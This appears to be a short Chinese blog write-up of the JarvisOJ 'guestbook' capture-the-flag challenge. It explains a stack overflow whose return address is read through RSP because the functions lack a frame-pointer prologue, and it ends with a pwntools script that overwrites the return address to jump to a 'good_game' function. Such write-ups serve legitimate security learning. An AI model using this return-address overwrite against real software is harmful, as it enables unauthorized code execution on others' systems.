---
title: guestbook
date: 2019=07-23
categories:
- javrisoj
tags: stack RSP
---

**<font style = 'font-size:25px'>RSP和返回地址的关系</font>**

# 漏洞

- 栈溢出
- 不同的是
    ![process](https://c-ssl.duitang.com/uploads/item/201907/23/20190723214542_AaQ2l.png)
    ![gdb](https://c-ssl.duitang.com/uploads/item/201907/23/20190723214542_4KViN.thumb.700_0.png)
    这里使用的是`RSP`指向位置的内容作为返回地址
# 原因

- 看他的汇编   
    ![armasm](https://c-ssl.duitang.com/uploads/item/201907/23/20190723215016_trrVX.thumb.700_0.png)   
    在`main`函数开始的时候，并没有像正常流程那样
    ```armasm
    push    rbp
    mov     rbp, rsp
    ```
    而且不止是main函数，所有二进制文件的函数都没有这一步。    
    这个题应该是所有数据都根据`RSP`寻址。

# exp

```python
from  pwn import * 

context.log_level = 'debug'
context.terminal = ['deepin-terminal','-x','sh','-c']

sh = process('./guestbook')
#sh = remote('pwn.jarvisoj.com', 9876)
elf = ELF('./guestbook')
addr = elf.symbols['good_game']

gdb.attach(sh)
payload = 'A' * 0x88  + p64(addr)
sh.sendlineafter('\n',payload)

sh.interactive()
sh.close()
```